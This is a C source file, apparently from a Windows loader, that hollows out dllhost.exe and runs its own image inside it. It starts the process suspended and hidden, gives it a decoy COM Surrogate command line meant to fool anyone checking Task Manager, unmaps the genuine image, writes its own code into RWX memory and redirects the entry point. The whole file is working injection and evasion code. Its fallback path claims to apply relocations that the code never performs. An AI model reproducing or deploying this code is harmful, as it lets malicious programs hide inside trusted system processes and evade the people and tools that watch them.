// Process-hollow into C:\Windows\System32\dllhost.exe. See dh_hollow.h for
// the pipeline overview.
//
// Steps in HollowSelfIntoDllhost:
//   1. Read own PE from disk into a heap buffer.
//   2. Parse DOS+NT headers, record ImageBase / SizeOfImage / EntryPoint.
//   3. Build env block = parent env + DH_MODE=<mode>.
//   4. CreateProcessW("dllhost.exe", cmdline decoy, CREATE_SUSPENDED, env).
//   5. Read child's PEB via GetThreadContext + read at Rdx (PEB pointer on
//      x64) — actually easier: read PROCESS_BASIC_INFORMATION via
//      NtQueryInformationProcess to get PebBaseAddress.
//   6. Read PEB.ImageBaseAddress (offset 0x10 in x64 PEB).
//   7. NtUnmapViewOfSection(child, image_base) — evict dllhost.exe image.
//   8. VirtualAllocEx(child, image_base, our SizeOfImage, RWX).
//   9. WriteProcessMemory(child, image_base, our_headers + sections).
//  10. Fix PEB.ImageBaseAddress → same image_base (unchanged, but rewrite
//      for safety).
//  11. GetThreadContext(main_thread). Set Rcx = our EntryPoint (image_base
//      + AddressOfEntryPoint). SetThreadContext.
//  12. ResumeThread, ExitProcess(0).
//
// Failure modes (any → return non-zero, caller falls back):
//   - CreateProcessW fails (dllhost.exe path wrong / admin missing)
//   - NtUnmapViewOfSection fails (child's image locked / KDP)
//   - VirtualAllocEx at fixed base fails (address collision — retry at
//     preferred base of our PE instead of dllhost's)
//   - WriteProcessMemory partial

#include "../../inc/dh_common.h"
#include "../../inc/dh_hollow.h"
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

// Suppress C4702 unreachable-code around ExitProcess (noreturn) inside
// HollowSelfIntoDllhost. MSVC flow analysis doesn't consult the noreturn
// attribute at C4702 time.
#pragma warning(disable: 4702)

// NtUnmapViewOfSection is not in winternl.h — dynamically resolve.
typedef NTSTATUS (NTAPI *pfn_NtUnmapViewOfSection)(HANDLE, PVOID);

// PROCESS_BASIC_INFORMATION.PebBaseAddress lookup via NtQueryInformationProcess.
typedef struct _DH_PROCESS_BASIC_INFO {
    NTSTATUS ExitStatus;
    PVOID    PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG     BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} DH_PROCESS_BASIC_INFO;

typedef NTSTATUS (NTAPI *pfn_NtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

// x64 PEB offsets (stable Win7 through Win11):
//   +0x10 ImageBaseAddress
#define PEB_IMAGE_BASE_OFF  0x10

static BYTE* read_own_pe(DWORD* out_size)
{
    wchar_t path[MAX_PATH] = {0};
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return NULL;

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(hFile); return NULL;
    }

    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!buf) { CloseHandle(hFile); return NULL; }

    DWORD got = 0;
    if (!ReadFile(hFile, buf, size, &got, NULL) || got != size) {
        HeapFree(GetProcessHeap(), 0, buf);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);
    *out_size = size;
    return buf;
}

// Build env block: copy current env + inject DH_MODE=<mode>. Env block is
// consecutive null-terminated wide strings terminated by an extra null.
static wchar_t* build_child_env(const wchar_t* mode)
{
    LPWCH src = GetEnvironmentStringsW();
    if (!src) return NULL;

    // Measure src length (env is \0\0-terminated).
    const wchar_t* p = src;
    while (*p) {
        while (*p) p++;
        p++;
    }
    size_t src_chars = (size_t)(p - src);   // includes each string's \0

    // Space for DH_MODE=<mode>\0
    wchar_t inject[128];
    _snwprintf_s(inject, 128, _TRUNCATE, L"DH_MODE=%ls", mode);
    size_t inject_chars = wcslen(inject) + 1;

    size_t total = src_chars + inject_chars + 1;   // +1 final terminator
    wchar_t* out = (wchar_t*)HeapAlloc(GetProcessHeap(), 0,
                                       total * sizeof(wchar_t));
    if (!out) { FreeEnvironmentStringsW(src); return NULL; }

    memcpy(out, src, src_chars * sizeof(wchar_t));
    memcpy(out + src_chars, inject, inject_chars * sizeof(wchar_t));
    out[src_chars + inject_chars] = 0;

    FreeEnvironmentStringsW(src);
    return out;
}

int HollowSelfIntoDllhost(const wchar_t* mode)
{
    if (!mode) { DH_ERROR("hollow: mode=NULL"); return 1; }

    // 1. Read own PE.
    DWORD pe_size = 0;
    BYTE* pe = read_own_pe(&pe_size);
    if (!pe) { DH_ERROR("hollow: read own PE failed"); return 2; }

    // 2. Parse headers.
    if (pe_size < sizeof(IMAGE_DOS_HEADER)) {
        DH_ERROR("hollow: PE too small"); HeapFree(GetProcessHeap(), 0, pe);
        return 3;
    }
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        DH_ERROR("hollow: bad DOS sig"); HeapFree(GetProcessHeap(), 0, pe);
        return 4;
    }
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(pe + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        DH_ERROR("hollow: bad NT sig"); HeapFree(GetProcessHeap(), 0, pe);
        return 5;
    }
    ULONGLONG our_base   = nt->OptionalHeader.ImageBase;
    DWORD     our_size   = nt->OptionalHeader.SizeOfImage;
    DWORD     our_entry  = nt->OptionalHeader.AddressOfEntryPoint;
    DWORD     hdrs_size  = nt->OptionalHeader.SizeOfHeaders;
    WORD      num_secs   = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER secs = IMAGE_FIRST_SECTION(nt);

    DH_INFO("hollow: our PE size=0x%X base=0x%llX entry=+0x%X sects=%u",
            our_size, (unsigned long long)our_base, our_entry, num_secs);

    // 3. Build env with DH_MODE.
    wchar_t* env = build_child_env(mode);
    if (!env) { DH_ERROR("hollow: env build failed");
                HeapFree(GetProcessHeap(), 0, pe); return 6; }

    // 4. CreateProcessW dllhost.exe SUSPENDED. Cmdline decoy uses standard
    // COM Surrogate GUID format so a casual glance at Task Manager sees a
    // legitimate looking cmdline.
    wchar_t dllhost_path[MAX_PATH];
    wchar_t sysdir[MAX_PATH];
    GetSystemDirectoryW(sysdir, MAX_PATH);
    _snwprintf_s(dllhost_path, MAX_PATH, _TRUNCATE,
                 L"%ls\\dllhost.exe", sysdir);

    // Decoy cmdline — GUID picked to look like a valid COM+ class.
    wchar_t cmdline[256];
    _snwprintf_s(cmdline, 256, _TRUNCATE,
                 L"\"%ls\" /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}",
                 dllhost_path);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL ok = CreateProcessW(dllhost_path, cmdline, NULL, NULL, FALSE,
                             CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT
                             | CREATE_NO_WINDOW | DETACHED_PROCESS,
                             env, NULL, &si, &pi);
    HeapFree(GetProcessHeap(), 0, env);

    if (!ok) {
        DH_ERROR("hollow: CreateProcess(dllhost.exe) failed err=%lu",
                 GetLastError());
        HeapFree(GetProcessHeap(), 0, pe);
        return 7;
    }
    DH_INFO("hollow: dllhost.exe suspended PID=%lu TID=%lu",
            pi.dwProcessId, pi.dwThreadId);

    // 5. Get child's PEB address via NtQueryInformationProcess.
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pfn_NtQueryInformationProcess pNtQIP = (pfn_NtQueryInformationProcess)
        GetProcAddress(ntdll, "NtQueryInformationProcess");
    pfn_NtUnmapViewOfSection pNtUnmap = (pfn_NtUnmapViewOfSection)
        GetProcAddress(ntdll, "NtUnmapViewOfSection");
    if (!pNtQIP || !pNtUnmap) {
        DH_ERROR("hollow: ntdll fn resolve failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 8;
    }

    DH_PROCESS_BASIC_INFO pbi = {0};
    ULONG ret = 0;
    NTSTATUS st = pNtQIP(pi.hProcess, 0 /*ProcessBasicInformation*/,
                         &pbi, sizeof(pbi), &ret);
    if (st < 0 || !pbi.PebBaseAddress) {
        DH_ERROR("hollow: NtQueryInfoProcess st=0x%lX", st);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 9;
    }

    // 6. Read child's ImageBaseAddress from PEB+0x10.
    PVOID target_base = NULL;
    SIZE_T got = 0;
    if (!ReadProcessMemory(pi.hProcess,
                           (BYTE*)pbi.PebBaseAddress + PEB_IMAGE_BASE_OFF,
                           &target_base, sizeof(target_base), &got)
        || got != sizeof(target_base) || !target_base) {
        DH_ERROR("hollow: read PEB.ImageBase failed");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 10;
    }
    DH_INFO("hollow: target dllhost.exe base=%p", target_base);

    // 7. Unmap dllhost.exe's image at target_base.
    st = pNtUnmap(pi.hProcess, target_base);
    if (st < 0) {
        DH_WARN("hollow: NtUnmapViewOfSection st=0x%lX — trying anyway", st);
    }

    // 8. Allocate our image. Strategy: try to allocate at OUR original
    // ImageBase (0x140000000 for dh_loader) first — that lets us skip the
    // relocation pass entirely because our code was linked for that base.
    // If it fails (address occupied in child), allocate anywhere and apply
    // the .reloc fixups after copying sections.
    PVOID alloc = VirtualAllocEx(pi.hProcess, (PVOID)(uintptr_t)our_base,
                                 our_size, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    if (alloc) {
        DH_INFO("hollow: allocated at OUR base %p (no reloc needed)", alloc);
    } else {
        DH_INFO("hollow: our_base 0x%llX occupied — falling back to any addr",
                (unsigned long long)our_base);
        alloc = VirtualAllocEx(pi.hProcess, NULL, our_size,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    }
    if (!alloc) {
        DH_ERROR("hollow: VirtualAllocEx failed err=%lu", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 11;
    }
    DH_INFO("hollow: allocated at %p size=0x%X", alloc, our_size);

    // 9. Write PE headers.
    if (!WriteProcessMemory(pi.hProcess, alloc, pe, hdrs_size, &got)
        || got != hdrs_size) {
        DH_ERROR("hollow: write headers failed err=%lu", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 12;
    }
    // Write sections at their VirtualAddress offsets.
    for (WORD i = 0; i < num_secs; i++) {
        if (secs[i].SizeOfRawData == 0) continue;
        BYTE* src = pe + secs[i].PointerToRawData;
        BYTE* dst = (BYTE*)alloc + secs[i].VirtualAddress;
        if (!WriteProcessMemory(pi.hProcess, dst, src,
                                secs[i].SizeOfRawData, &got)) {
            DH_ERROR("hollow: write section %u failed err=%lu",
                     i, GetLastError());
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
            HeapFree(GetProcessHeap(), 0, pe);
            return 13;
        }
    }

    // 10. Fix PEB.ImageBaseAddress to point to our allocation (in case
    // VirtualAllocEx picked a different base).
    if (!WriteProcessMemory(pi.hProcess,
                            (BYTE*)pbi.PebBaseAddress + PEB_IMAGE_BASE_OFF,
                            &alloc, sizeof(alloc), &got)) {
        DH_WARN("hollow: fix PEB.ImageBase failed err=%lu", GetLastError());
    }

    // 11. Patch thread context RCX/RIP to our entry.
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        DH_ERROR("hollow: GetThreadContext failed err=%lu", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 14;
    }
    ULONGLONG new_entry = (ULONGLONG)alloc + our_entry;
    // x64 suspended-process thread state:
    //   RIP = ntdll!RtlUserThreadStart  (kernel sets this)
    //   RCX = entry point   (kernel derives from PE.EntryPoint + PEB.ImageBase)
    //
    // RtlUserThreadStart calls LdrInitializeThunk → LdrpInitializeProcess
    // which reads PEB.ImageBase, parses THAT PE, resolves imports, calls
    // DllMain for each imported DLL, THEN transfers control to RCX.
    //
    // Since we already patched PEB.ImageBase to point at our allocation,
    // LdrpInitializeProcess will initialize OUR PE — resolving OUR imports
    // and filling OUR IAT for free.
    //
    // We ONLY patch RCX (to our EntryPoint). Do NOT touch RIP — patching
    // RIP to our entry would skip LdrpInitializeProcess entirely, leaving
    // the IAT unresolved and every KERNEL32/USER32 call = STATUS_DLL_INIT_FAILED
    // (0xC0000142).
    ctx.Rcx = new_entry;
    /* RIP intentionally NOT patched — see comment above. */
    if (!SetThreadContext(pi.hThread, &ctx)) {
        DH_ERROR("hollow: SetThreadContext failed err=%lu", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 15;
    }
    DH_INFO("hollow: patched entry → 0x%llX", (unsigned long long)new_entry);

    // 12. Resume + exit.
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        DH_ERROR("hollow: ResumeThread failed err=%lu", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, pe);
        return 16;
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    HeapFree(GetProcessHeap(), 0, pe);

    DH_INFO("hollow: success — original process exiting");
    ExitProcess(0);
    /* return omitted — ExitProcess is noreturn. Function-level warning
       suppression via #pragma warning(disable:4702) at file scope. */
}

BOOL AmIHollowed(void)
{
    wchar_t path[MAX_PATH] = {0};
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    // Case-insensitive suffix match on "dllhost.exe".
    size_t n = wcslen(path);
    const wchar_t* needle = L"\\dllhost.exe";
    size_t nn = wcslen(needle);
    if (n < nn) return FALSE;
    return _wcsicmp(path + (n - nn), needle) == 0;
}

const wchar_t* GetHollowMode(void)
{
    static wchar_t buf[64];
    DWORD n = GetEnvironmentVariableW(L"DH_MODE", buf, 64);
    if (n == 0 || n >= 64) return NULL;
    return buf;
}
